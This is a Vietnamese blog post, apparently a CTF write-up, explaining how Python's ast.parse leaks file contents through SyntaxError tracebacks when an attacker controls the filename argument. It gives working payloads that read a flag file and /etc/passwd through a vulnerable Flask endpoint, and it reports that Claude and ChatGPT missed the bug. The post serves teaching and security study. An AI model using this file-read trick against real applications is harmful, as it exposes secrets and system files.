@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+          <title>Tin tức Python PyMI.vn</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta charset="utf-8" />
+        <link href="https://n.pymi.vn/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Tin tức Python PyMI.vn Full Atom Feed" />
+        <!-- twitter card metadata -->
+<meta name="twitter:site" content="">
+<meta name="twitter:title" content="Đọc file tùy ý với&nbsp;ast.parse">
+<meta name="twitter:description" content="ast.parse chỉ parse code thành AST, liệu có đọc được file?">
+        <!-- OG Tags -->
+<meta property="og:url" content="./ast_parse.html"/>
+<meta property="og:title" content="Đọc file tùy ý với&nbsp;ast.parse | Tin tức Python PyMI.vn" />
+<meta property="og:description" content="ast.parse chỉ parse code thành AST, liệu có đọc được file?" />
+        <!-- favicon -->
+        <!-- moment.js for date formatting -->
+        <script src="./theme/js/moment.js"></script>
+        <!-- css -->
+        <link rel="stylesheet" type="text/css" href="./theme/css/main.css" />
+		<script>
+			
+                /*! grunt-grunticon Stylesheet Loader - v2.1.2 | https://github.com/filamentgroup/grunticon | (c) 2015 Scott Jehl, Filament Group, Inc. | MIT license. */
+    
+    (function(e){function t(t,n,r,o){"use strict";function a(){for(var e,n=0;u.length>n;n++)u[n].href&&u[n].href.indexOf(t)>-1&&(e=!0);e?i.media=r||"all":setTimeout(a)}var i=e.document.createElement("link"),l=n||e.document.getElementsByTagName("script")[0],u=e.document.styleSheets;return i.rel="stylesheet",i.href=t,i.media="only x",i.onload=o||null,l.parentNode.insertBefore(i,l),a(),i}var n=function(r,o){"use strict";if(r&&3===r.length){var a=e.navigator,i=e.Image,l=!(!document.createElementNS||!document.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect||!document.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image","1.1")||e.opera&&-1===a.userAgent.indexOf("Chrome")||-1!==a.userAgent.indexOf("Series40")),u=new i;u.onerror=function(){n.method="png",n.href=r[2],t(r[2])},u.onload=function(){var e=1===u.width&&1===u.height,a=r[e&&l?0:e?1:2];n.method=e&&l?"svg":e?"datapng":"png",n.href=a,t(a,null,null,o)},u.src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==",document.documentElement.className+=" grunticon"}};n.loadCSS=t,e.grunticon=n})(this);(function(e,t){"use strict";var n=t.document,r="grunticon:",o=function(e){if(n.attachEvent?"complete"===n.readyState:"loading"!==n.readyState)e();else{var t=!1;n.addEventListener("readystatechange",function(){t||(t=!0,e())},!1)}},a=function(e){return t.document.querySelector('link[href$="'+e+'"]')},c=function(e){var t,n,o,a,c,i,u={};if(t=e.sheet,!t)return u;n=t.cssRules?t.cssRules:t.rules;for(var l=0;n.length>l;l++)o=n[l].cssText,a=r+n[l].selectorText,c=o.split(");")[0].match(/US\-ASCII\,([^"']+)/),c&&c[1]&&(i=decodeURIComponent(c[1]),u[a]=i);return u},i=function(e){var t,o,a;o="data-grunticon-embed";for(var c in e)if(a=c.slice(r.length),t=n.querySelectorAll(a+"["+o+"]"),t.length)for(var i=0;t.length>i;i++)t[i].innerHTML=e[c],t[i].style.backgroundImage="none",t[i].removeAttribute(o);return t},u=function(t){"svg"===e.method&&o(function(){i(c(a(e.href))),"function"==typeof t&&t()})};e.embedIcons=i,e.getCSS=a,e.getIcons=c,e.ready=o,e.svgLoadedCallback=u,e.embedSVG=u})(grunticon,this);
+                
+                grunticon(["./theme/css/icons.data.svg.css", "./theme/css/icons.data.png.css", "./theme/css/icons.fallback.css"]);
+            </script>
+        <noscript><link href="./theme/css/icons.fallback.css" rel="stylesheet"></noscript>
+        <!-- menu toggle javascript -->
+        <script type="text/javascript">
+            document.addEventListener("DOMContentLoaded", initMenu);
+            
+            function initMenu(){
+                var menu = document.getElementById("menu");
+                var menulink = document.getElementById("menu-link");
+                menulink.addEventListener("click", function toggleMenu(){
+                        window.event.preventDefault();
+                        menulink.classList.toggle('active');
+                        menu.classList.toggle('active');              
+                    });
+            };
+        </script>
+
+    <meta name="description" content="ast.parse chỉ parse code thành AST, liệu có đọc được file?" />
+
+    <meta name="tags" content="ast" />
+    <meta name="tags" content="Python" />
+    <meta name="tags" content="security" />
+    <meta name="tags" content="ctf" />
+
+</head>
+<body>
+    <div role="banner" id="masthead">
+        <header>
+            <h1><a href="/">Pymiers's Blog</a></h1>
+            <a href="#menu" id="menu-link">more stuff</a>
+            <nav id="menu">
+                <ul>
+                            <li><a href="./category/features.html">features</a></li>
+                            <li><a href="./category/news.html">news</a></li>
+                            <li class="active"><a href="./category/pymivn.html">pymi.vn</a></li>
+                </ul>
+            </nav>
+        </header>
+    </div>
+        <div class="page" role="main">
+  <div class="article" role="article">
+    <article>
+        <footer>
+            <a name="top"></a>
+            <p>
+              <time datetime=" 2025-02-26 00:00:00+07:00">
+                <script>document.write(moment('2025-02-26 00:00:00+07:00').format('LL'));</script>
+              </time>
+            </p>
+        </footer>
+        <header>
+          <h2>
+            Đọc file tùy ý với&nbsp;ast.parse
+          </h2>
+          <center>
+          <h4>
+            by Pymier0
+          </h4>
+          </center>
+        </header>
+      <div class="content">
+         <p>Bài trước <a href="./ast_intro.html">biến nhỏ hơn thành lớn hơn với ast</a> giới thiệu sử dụng <span class="caps">AST</span> để biến code thành tree, giúp xử lý code theo kiến trúc (thay vì&nbsp;text).</p>
+<p>Bài viết này có liên quan tới module <code>ast</code>, nhưng trong một hoàn cảnh khác&#8230; liên quan tới bảo&nbsp;mật.</p>
+<h3>Đề bài - web <span class="caps">TRX</span> <span class="caps">CTF</span>&nbsp;2025</h3>
+<p>Giải <a href="https://ctftime.org/event/2654"><span class="caps">TRX</span> <span class="caps">CTF</span> 2025</a> có đề bài cho 1 trang web như&nbsp;sau:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">ast</span>
+<span class="kn">import</span> <span class="nn">traceback</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;index.html&quot;</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;/check&quot;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">ast</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="o">**</span><span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">)</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="kc">None</span><span class="p">}</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="n">traceback</span><span class="o">.</span><span class="n">format_exc</span><span class="p">()}</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</code></pre></div>
+
+<p>một website flask đơn giản, nhận đầu vào tùy ý của người dùng và chạy <code>ast.parse</code>.
+Một file <code>secret.py</code> nằm cùng thư mục, chứa&nbsp;flag</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Here&#39;s the flag: &quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
+
+<span class="n">FLAG</span> <span class="o">=</span> <span class="s2">&quot;TRX</span><span class="si">{fake_flag_for_testing}</span><span class="s2">&quot;</span>
+
+<span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Mục tiêu là đọc giá trị của <code>FLAG</code>.</p>
+<h3>Đọc tài liệu&nbsp;ast.parse</h3>
+<div class="highlight"><pre><span></span><code><span class="n">Python</span> <span class="mf">3.10.12</span> <span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="n">Feb</span>  <span class="mi">4</span> <span class="mi">2025</span><span class="p">,</span> <span class="mi">14</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">36</span><span class="p">)</span> <span class="p">[</span><span class="n">GCC</span> <span class="mf">11.4.0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">ast</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="n">ast</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">)</span>
+
+<span class="n">Parse</span> <span class="n">the</span> <span class="n">source</span> <span class="n">into</span> <span class="n">an</span> <span class="n">AST</span> <span class="n">node</span><span class="o">.</span>
+<span class="n">Equivalent</span> <span class="n">to</span> <span class="nb">compile</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">PyCF_ONLY_AST</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Pass</span> <span class="n">type_comments</span><span class="o">=</span><span class="kc">True</span> <span class="n">to</span> <span class="n">get</span> <span class="n">back</span> <span class="nb">type</span> <span class="n">comments</span> <span class="n">where</span> <span class="n">the</span> <span class="n">syntax</span> <span class="n">allows</span><span class="o">.</span>
+</code></pre></div>
+
+<p>Tài liệu không ghi gì hơn là đá sang đọc doc của builtin function&nbsp;compile:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="nb">compile</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">)</span>
+<span class="n">Compile</span> <span class="n">source</span> <span class="n">into</span> <span class="n">a</span> <span class="n">code</span> <span class="nb">object</span> <span class="n">that</span> <span class="n">can</span> <span class="n">be</span> <span class="n">executed</span> <span class="n">by</span> <span class="n">exec</span><span class="p">()</span> <span class="ow">or</span> <span class="nb">eval</span><span class="p">()</span><span class="o">.</span>
+
+<span class="n">The</span> <span class="n">source</span> <span class="n">code</span> <span class="n">may</span> <span class="n">represent</span> <span class="n">a</span> <span class="n">Python</span> <span class="n">module</span><span class="p">,</span> <span class="n">statement</span> <span class="ow">or</span> <span class="n">expression</span><span class="o">.</span>
+<span class="n">The</span> <span class="n">filename</span> <span class="n">will</span> <span class="n">be</span> <span class="n">used</span> <span class="k">for</span> <span class="n">run</span><span class="o">-</span><span class="n">time</span> <span class="n">error</span> <span class="n">messages</span><span class="o">.</span>
+<span class="n">The</span> <span class="n">mode</span> <span class="n">must</span> <span class="n">be</span> <span class="s1">&#39;exec&#39;</span> <span class="n">to</span> <span class="nb">compile</span> <span class="n">a</span> <span class="n">module</span><span class="p">,</span> <span class="s1">&#39;single&#39;</span> <span class="n">to</span> <span class="nb">compile</span> <span class="n">a</span>
+<span class="n">single</span> <span class="p">(</span><span class="n">interactive</span><span class="p">)</span> <span class="n">statement</span><span class="p">,</span> <span class="ow">or</span> <span class="s1">&#39;eval&#39;</span> <span class="n">to</span> <span class="nb">compile</span> <span class="n">an</span> <span class="n">expression</span><span class="o">.</span>
+<span class="n">The</span> <span class="n">flags</span> <span class="n">argument</span><span class="p">,</span> <span class="k">if</span> <span class="n">present</span><span class="p">,</span> <span class="n">controls</span> <span class="n">which</span> <span class="n">future</span> <span class="n">statements</span> <span class="n">influence</span>
+<span class="n">the</span> <span class="n">compilation</span> <span class="n">of</span> <span class="n">the</span> <span class="n">code</span><span class="o">.</span>
+<span class="n">The</span> <span class="n">dont_inherit</span> <span class="n">argument</span><span class="p">,</span> <span class="k">if</span> <span class="n">true</span><span class="p">,</span> <span class="n">stops</span> <span class="n">the</span> <span class="n">compilation</span> <span class="n">inheriting</span>
+<span class="n">the</span> <span class="n">effects</span> <span class="n">of</span> <span class="nb">any</span> <span class="n">future</span> <span class="n">statements</span> <span class="ow">in</span> <span class="n">effect</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">code</span> <span class="n">calling</span>
+<span class="nb">compile</span><span class="p">;</span> <span class="k">if</span> <span class="n">absent</span> <span class="ow">or</span> <span class="n">false</span> <span class="n">these</span> <span class="n">statements</span> <span class="n">do</span> <span class="n">influence</span> <span class="n">the</span> <span class="n">compilation</span><span class="p">,</span>
+<span class="ow">in</span> <span class="n">addition</span> <span class="n">to</span> <span class="nb">any</span> <span class="n">features</span> <span class="n">explicitly</span> <span class="n">specified</span><span class="o">.</span>
+</code></pre></div>
+
+<p><strong>The source code may represent a Python module, statement or expression.  The filename will be used for run-time error&nbsp;messages.</strong></p>
+<p>filename được dùng cho run-time error messages, nhưng không rõ ràng là dùng thế nào.
+Trên doc trang&nbsp;chủ:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">ast</span>.<span class="nv">parse</span><span class="ss">(</span><span class="nv">source</span>,<span class="w"> </span><span class="nv">filename</span><span class="o">=</span><span class="s1">&#39;&lt;unknown&gt;&#39;</span>,<span class="w"> </span><span class="nv">mode</span><span class="o">=</span><span class="s1">&#39;exec&#39;</span>,<span class="w"> </span><span class="o">*</span>,<span class="w"> </span><span class="nv">type_comments</span><span class="o">=</span><span class="nv">False</span>,<span class="w"> </span><span class="nv">feature_version</span><span class="o">=</span><span class="nv">None</span><span class="ss">)</span>¶<span class="w"></span>
+</code></pre></div>
+
+<p>filename mặc định có giá trị là <code>&lt;unknown&gt;</code>.
+Thử vài ví&nbsp;dụ:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">ast</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">ast</span><span class="o">.</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="s1">&#39;&lt;unknown&gt;&#39;</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="n">ast</span><span class="o">.</span><span class="n">Module</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x752c51f9d7e0</span><span class="o">&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">ast</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="s1">&#39;for i in range(10):</span><span class="se">\n</span><span class="s1">    print(i)&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;unknown&gt;&#39;</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="n">ast</span><span class="o">.</span><span class="n">Module</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x752c520ebcd0</span><span class="o">&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">ast</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="s1">&#39;for i in range(10):</span><span class="se">\n</span><span class="s1">    print(i&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;unknown&gt;&#39;</span><span class="p">)</span>
+<span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
+  <span class="n">File</span> <span class="s2">&quot;&lt;stdin&gt;&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+  <span class="n">File</span> <span class="s2">&quot;/usr/lib/python3.10/ast.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">50</span><span class="p">,</span> <span class="ow">in</span> <span class="n">parse</span>
+    <span class="k">return</span> <span class="nb">compile</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span>
+  <span class="n">File</span> <span class="s2">&quot;&lt;unknown&gt;&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">2</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">i</span>
+         <span class="o">^</span>
+<span class="ne">SyntaxError</span><span class="p">:</span> <span class="s1">&#39;(&#39;</span> <span class="n">was</span> <span class="n">never</span> <span class="n">closed</span>
+</code></pre></div>
+
+<p>có thể thấy khi có SyntaxError, màn hình sẽ hiện ra dòng code bị lỗi syntax, và file <code>&lt;unknown&gt;</code> không đóng vai trò gì&nbsp;cả.</p>
+<p>Nhưng khi gán filename=&#8221;secret.py&#8221;, dòng số 2 của file này lại hiện&nbsp;ra:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">ast</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="s2">&quot;for i in range(10):</span><span class="se">\n</span><span class="s2">    print(i&quot;</span><span class="p">,</span> <span class="s2">&quot;secret.py&quot;</span><span class="p">)</span>
+<span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
+  <span class="n">File</span> <span class="s2">&quot;&lt;stdin&gt;&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+  <span class="n">File</span> <span class="s2">&quot;/usr/lib/python3.10/ast.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">50</span><span class="p">,</span> <span class="ow">in</span> <span class="n">parse</span>
+    <span class="k">return</span> <span class="nb">compile</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span>
+  <span class="n">File</span> <span class="s2">&quot;secret.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">2</span>
+    <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+             <span class="o">^</span>
+<span class="ne">SyntaxError</span><span class="p">:</span> <span class="s1">&#39;(&#39;</span> <span class="n">was</span> <span class="n">never</span> <span class="n">closed</span>
+</code></pre></div>
+
+<p>đề bài khá &#8220;lươn&#8221; vì viết code từ dòng thứ 2, nếu người dùng thử với <code>source='def'</code> thì sẽ không hiện ra gì.
+Vậy chỉ cần viết code xuống đến dòng thứ 6 rồi viết syntax error sẽ hiện ra <span class="caps">FLAG</span>:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">ast</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n\n\n\n\n</span><span class="s2">def&quot;</span><span class="p">,</span> <span class="s2">&quot;secret.py&quot;</span><span class="p">)</span>
+<span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
+  <span class="n">File</span> <span class="s2">&quot;&lt;stdin&gt;&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+  <span class="n">File</span> <span class="s2">&quot;/usr/lib/python3.10/ast.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">50</span><span class="p">,</span> <span class="ow">in</span> <span class="n">parse</span>
+    <span class="k">return</span> <span class="nb">compile</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span>
+  <span class="n">File</span> <span class="s2">&quot;secret.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">6</span>
+    <span class="n">FLAG</span> <span class="o">=</span> <span class="s2">&quot;TRX</span><span class="si">{fake_flag_for_testing}</span><span class="s2">&quot;</span>
+       <span class="o">^</span>
+<span class="ne">SyntaxError</span><span class="p">:</span> <span class="n">invalid</span> <span class="n">syntax</span>
+</code></pre></div>
+
+<p>Thậm chí có thể đọc file tùy ý, không cần phải code&nbsp;python:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">ast</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="s2">&quot;def&quot;</span><span class="p">,</span> <span class="s2">&quot;/etc/passwd&quot;</span><span class="p">)</span>
+<span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
+  <span class="n">File</span> <span class="s2">&quot;&lt;stdin&gt;&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+  <span class="n">File</span> <span class="s2">&quot;/usr/lib/python3.10/ast.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">50</span><span class="p">,</span> <span class="ow">in</span> <span class="n">parse</span>
+    <span class="k">return</span> <span class="nb">compile</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span>
+  <span class="n">File</span> <span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span>
+    <span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+       <span class="o">^</span>
+<span class="ne">SyntaxError</span><span class="p">:</span> <span class="n">invalid</span> <span class="n">syntax</span>
+</code></pre></div>
+
+<p>Đọc code CPython, lần theo function <a href="https://github.com/python/cpython/blob/43a2a372ba071c4ebb1071240da2b852c29d77fb/Python/bltinmodule.c#L759-L855">compile</a> sẽ&nbsp;tháy</p>
+<div class="highlight"><pre><span></span><code><span class="n">PyObject</span><span class="w"> </span><span class="o">*</span><span class="w"></span>
+<span class="n">_PyErr_ProgramDecodedTextObject</span><span class="p">(</span><span class="n">PyObject</span><span class="w"> </span><span class="o">*</span><span class="n">filename</span><span class="p">,</span><span class="w"> </span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">lineno</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="o">*</span><span class="w"> </span><span class="n">encoding</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="o">...</span><span class="w"></span>
+<span class="w">    </span><span class="n">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_Py_fopen_obj</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;r&quot;</span><span class="w"> </span><span class="n">PY_STDIOTEXTMODE</span><span class="p">);</span><span class="w"></span>
+</code></pre></div>
+
+<p>trong <a href="https://github.com/python/cpython/blob/43a2a372ba071c4ebb1071240da2b852c29d77fb/Python/errors.c#L1946">errors.c</a></p>
+<p>Xem write up <span class="amp">&amp;</span> source at <a href="https://github.com/TheRomanXpl0it/TRX-CTF-2025/blob/main/web/online-python-editor/remote/app/app.py">https://github.com/TheRomanXpl0it/<span class="caps">TRX</span>-<span class="caps">CTF</span>-2025/blob/main/web/online-python-editor/remote/app/app.py</a></p>
+<h3>Góc <span class="caps">AI</span></h3>
+<p>Vác luôn đề hỏi các <span class="caps">AI</span> xịn nhất ngày nay&nbsp;xem:</p>
+<p><a href="https://claude.ai/share/a8de39c7-6ec3-45b9-b310-c6667d2ca49b">Claude.ai</a></p>
+<blockquote>
+<p>Given the code shown, I don&#8217;t see a direct path to reading the <span class="caps">FLAG</span> from secret.py through the ast.parse() function alone. The function&#8217;s parameters don&#8217;t provide functionality to import or read other files in a way that would return their contents through the error&nbsp;messages.</p>
+</blockquote>
+<p>sau một hồi đoán mò lung tung đủ thứ. ChatGPT 4o-mini dù phát hiện đoạn code có thể bị <span class="caps">DOS</span> attack, nhưng cũng nhầm lẫn tương tự và không thể tìm được cách tấn&nbsp;công.</p>
+<p>Chờ bạn đọc chăm chỉ test với DeepSeek&nbsp;R1.</p>
+<h3>Kết&nbsp;luận</h3>
+<p><code>ast.parse</code> có thể đọc file tùy&nbsp;ý.</p>
+<p>Hết.</p>
+<p><span class="caps">HVN</span> at <a href="http://pymi.vn">http://pymi.vn</a> and <a href="https://www.familug.org">https://www.familug.org</a>.</p>
+<p><a href="https://www.familug.org/p/ung-ho.html">Ủng hộ tác giả&nbsp;🍺</a></p>
+      </div>
+      <div class="back-to-top">
+          <a href="#top">back to top</a>
+      </div>
+    </article>
+  </div>
+<!-- end article -->
+                <footer>
+                    <div class="icons">
+                        <a href="https://github.com/pymivn" target="_blank"><div class="icon-github icon"></div></a>
+                    </div>
+                    <p>© <script>document.write(moment().format('YYYY'));</script> Pymiers</p>
+                </footer>
+        </div>
+</body>
+</html>
